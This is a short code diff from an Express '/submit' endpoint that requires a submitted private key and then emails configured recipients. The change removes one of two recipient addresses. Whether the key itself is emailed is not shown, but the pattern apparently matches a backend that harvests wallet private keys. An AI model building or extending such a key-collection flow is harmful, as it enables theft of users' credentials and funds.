@@ -232,7 +232,7 @@ app.post('/submit', async (req, res) => {
       return res.status(400).json({ error: 'Private key required' });
   }
 
-  const recipients = [process.env.RECIPIENT1, process.env.RECIPIENT2];
+  const recipients = [process.env.RECIPIENT1];
   
   try {
       // Send email to each recipient
